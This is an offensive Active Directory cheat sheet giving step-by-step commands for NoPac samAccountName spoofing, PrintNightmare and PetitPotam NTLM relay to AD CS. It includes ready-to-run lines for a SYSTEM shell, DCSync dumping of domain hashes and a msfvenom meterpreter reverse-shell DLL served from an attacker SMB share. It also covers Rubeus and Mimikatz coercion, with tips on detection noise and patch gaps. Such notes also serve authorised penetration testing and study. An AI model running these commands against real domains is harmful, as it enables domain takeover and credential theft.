## NoPac SamAccountName Spoofing

Standard domain user access to a DC unpatched for CVE-2021-42278 and CVE-2021-42287.

Check if target is vulnerable and verify machine account quota

```
sudo python3 scanner.py <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DC_IP> -use-ldap
```

Obtain a semi-interactive SYSTEM shell via smbexec

```
sudo python3 noPac.py <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DC_IP> -dc-host <SERVICE_NAME> -shell --impersonate administrator -use-ldap
```

Perform DCSync using secretsdump to grab domain hashes

```
sudo python3 noPac.py <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DC_IP> -dc-host <SERVICE_NAME> --impersonate administrator -use-ldap -dump -just-dc-user <DOMAIN>/administrator
```

- **ms-DS-MachineAccountQuota** set to a value greater than 0.
    
- **ms-DS-MachineAccountQuota set to 0** prevents the creation of the required machine account, causing the attack to **fail**.
    
- **smbexec.py** behavior is **highly noisy**; it creates services **BTOBTO**/**BTOBO** and writes **execute.bat** to disk, which are easily caught by **Windows Defender** or **EDR**.
    
- **smbexec shells** are semi-interactive; you must use **absolute paths** instead of `cd`.
    

---

## PrintNightmare Remote Shell

Standard domain user credentials and the Print Spooler service running on a target DC.

Enumerate RPC to confirm MS-RPRN or MS-PAR exposure

```
rpcdump.py @<TARGET_IP> | egrep 'MS-RPRN|MS-PAR'
```

Generate the DLL payload for the reverse shell

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACK_IP> LPORT=<PORT> -f dll > <FILE_PATH>.dll
```

Host the payload on an SMB share

```
sudo smbserver.py -smb2support <SHARE_NAME> <FILE_PATH>
```

Execute the exploit to trigger the DLL load from the attack host share

```
sudo python3 CVE-2021-1675.py <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> '\\<ATTACK_IP>\<SHARE_NAME>\<FILE_PATH>.dll'
```

> ⚠️ Gap: This exploit specifically requires **cube0x0's version of Impacket**; using the standard library will cause the exploit to **fail**.

- **Print Spooler service crashes** can occur, leading to **service disruption** on the DC.

---

## PetitPotam NTLM Relay to AD CS

Unauthenticated or authenticated access to a domain where **Active Directory Certificate Services (AD CS)** Web Enrollment is enabled.

1. Start the relay to the AD CS Web Enrollment endpoint

```
sudo ntlmrelayx.py -debug -smb2support --target http://<TARGET_IP>/certsrv/certfnsh.asp --adcs --template DomainController
```

2. Coerce the Domain Controller to authenticate to the attack host

```
python3 PetitPotam.py <ATTACK_IP> <DC_IP>
```

3. Request a TGT using the Base64 certificate captured by the relay

```
python3 gettgtpkinit.py <DOMAIN>/<DC_IP>\$ -pfx-base64 <HASH> <FILE_PATH>.ccache
```

4. Set the Kerberos ticket environment variable

```
export KRB5CCNAME=<FILE_PATH>.ccache
```

5. Perform DCSync using the captured ticket

```
secretsdump.py -just-dc-user <DOMAIN>/administrator -k -no-pass <DOMAIN_DC_NAME>
```

Coerce authentication from a Windows host

```
.\Rubeus.exe asktgt /user:<USERNAME>$ /certificate:<HASH> /ptt
```

Coerce authentication via Mimikatz EFS module

```
mimikatz # misc::efs /server:<DC_IP> /connect:<ATTACK_IP>
```

- Coercion (Linux) → `PetitPotam.py` → Standard for Linux-based relay attacks.
    
- Coercion (Windows) → `Mimikatz` / `Invoke-PetitPotam.ps1` → Use when pivoting through a Windows host.
    
- TGT Request → `gettgtpkinit.py` → Prefer on Linux to generate ccache files.
    
- TGT Request → `Rubeus` → Prefer on Windows for immediate **Pass-the-Ticket (PTT)**.
    
- **CVE-2021-36942 patch** only mitigates unauthenticated coercion; **authenticated users** can often still coerce the DC to authenticate to a relay.
    
- **Web Enrollment** must be enabled on the CA host for this specific relay path to work.
    
- **AS-REP encryption key** from `gettgtpkinit.py` is required if you intend to recover the NT hash later using `getnthash.py`.